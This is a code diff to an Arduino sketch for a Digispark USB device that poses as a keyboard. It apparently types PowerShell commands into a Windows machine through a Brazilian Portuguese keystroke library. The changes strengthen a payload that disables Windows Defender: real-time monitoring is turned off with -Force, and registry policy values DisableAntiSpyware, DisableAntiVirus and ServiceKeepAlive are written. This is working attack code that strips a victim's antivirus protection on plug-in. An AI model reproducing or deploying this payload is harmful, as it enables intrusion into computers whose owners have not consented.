@@ -22,7 +22,17 @@ void loop() {
   DigiKeyboardPtBr.delay(500);
   DigiKeyboard.sendKeyStroke(KEY_ENTER);    
   // Desabilita o Windows Defender
-  DigiKeyboardPtBr.println("Set-MpPreference -DisableRealtimeMonitoring \$true -DisableScriptScanning \$true -DisableBehaviorMonitoring \$true -DisableIOAVProtection \$true -DisableIntrusionPreventionSystem \$true");  
+  DigiKeyboardPtBr.println("Set-MpPreference -DisableRealtimeMonitoring \$true -Force");
+  //DigiKeyboardPtBr.println("Set-MpPreference -DisableRealtimeMonitoring \$true -DisableScriptScanning \$true -DisableBehaviorMonitoring \$true -DisableIOAVProtection \$true -DisableIntrusionPreventionSystem \$true");  
+  DigiKeyboard.sendKeyStroke(KEY_ENTER); 
+  DigiKeyboardPtBr.delay(500);
+  DigiKeyboardPtBr.println("New-ItemProperty -Path 'HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows Defender' -Name 'DisableAntiSpyware' -Value 1 -PropertyType DWord -Force");
+  DigiKeyboard.sendKeyStroke(KEY_ENTER); 
+  DigiKeyboardPtBr.delay(500);  
+  DigiKeyboardPtBr.println("New-ItemProperty -Path 'HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows Defender' -Name 'DisableAntiVirus' -Value 1 -PropertyType DWord -Force");
+  DigiKeyboard.sendKeyStroke(KEY_ENTER); 
+  DigiKeyboardPtBr.delay(500);  
+  DigiKeyboardPtBr.println("New-ItemProperty -Path 'HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows Defender' -Name 'ServiceKeepAlive' -Value 0 -PropertyType DWord -Force");
   DigiKeyboard.sendKeyStroke(KEY_ENTER); 
   DigiKeyboardPtBr.println("exit");  
   pisca_led(1000);
